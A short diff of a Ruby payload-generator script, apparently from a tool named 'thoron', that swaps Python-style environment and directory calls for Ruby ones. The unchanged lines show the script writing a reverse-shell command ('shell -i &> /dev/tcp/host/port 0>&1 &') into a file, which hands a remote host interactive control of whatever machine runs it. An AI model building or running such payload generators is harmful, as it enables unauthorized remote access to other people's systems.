@@ -57,13 +57,13 @@ begin
     sleep(1)
     puts "#{g}Saving to #{file}..."
     sleep(0.5)
-    w = os.environ['OLDPWD']
-    os.chdir(w)
+    w = ENV['OLDPWD']
+    Dir.chdir(w)
     open(file, 'w') { |f|
         f.puts "#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &"
     }
-    g = os.environ['HOME']
-    os.chdir(g + "/thoron")
+    g = ENV['HOME']
+    Dir.chdir(g + "/thoron")
     puts "#{s}Saved to #{file}!"
 rescue
     puts "#{e}Failed to generate payload!"
